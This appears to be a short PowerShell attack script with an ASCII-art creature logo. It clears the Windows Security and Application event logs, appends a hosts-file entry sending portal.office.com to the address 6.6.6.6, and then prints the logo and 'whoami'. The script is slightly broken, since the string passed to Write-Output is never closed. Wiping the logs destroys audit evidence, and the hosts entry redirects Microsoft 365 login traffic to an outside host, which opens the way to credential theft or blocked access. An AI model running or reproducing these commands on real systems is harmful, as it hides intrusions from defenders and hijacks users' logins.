  $logo = "
             ___
           /    \
  ._.     /___/\ \
 :(_):    |6.6| \|
   \\     '.-.'  O
    \\____.-''-.____
     '---|      |---.\
         |==[]==|   _\\_
          \____/     /|\
          // \\
         //   \\
         \\    \\
         _\\    \\__
        (___|    \__)
"
wevtutil cl Security
wevtutil cl Application
echo 6.6.6.6 portal.office.com >> c:\windows\system32\drivers\etc\hosts
Clear-Host
Write-Output "$logo
whoami
